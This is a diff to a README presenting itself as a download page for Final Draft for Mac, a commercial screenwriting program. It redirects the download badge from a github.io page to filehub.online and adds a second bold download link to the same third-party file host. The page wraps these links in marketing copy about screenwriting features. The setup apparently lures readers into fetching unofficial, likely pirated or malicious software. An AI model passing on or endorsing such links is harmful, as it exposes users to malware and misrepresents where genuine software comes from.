@@ -1,6 +1,6 @@
 # Final Draft for Mac | Professional Screenwriting Software
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://liciroz34gf.github.io/Download-File/)
+[![Download](https://img.shields.io/badge/Download-blue)](https://filehub.online/)
 
 **🎬 Transform your storytelling process with Final Draft for Mac—the industry-standard screenwriting software trusted by screenwriters, filmmakers, television writers, students, and production studios worldwide. Create, organize, and perfect your scripts with powerful writing tools designed specifically for professional screenplay development.**
 
@@ -64,6 +64,8 @@
 * Scheduling preparation
 * Export and printing options
 
+
+[**⬇️ DOWNLOAD**](https://filehub.online/)
 
 # 🚀 Why Choose Final Draft for Mac?
 
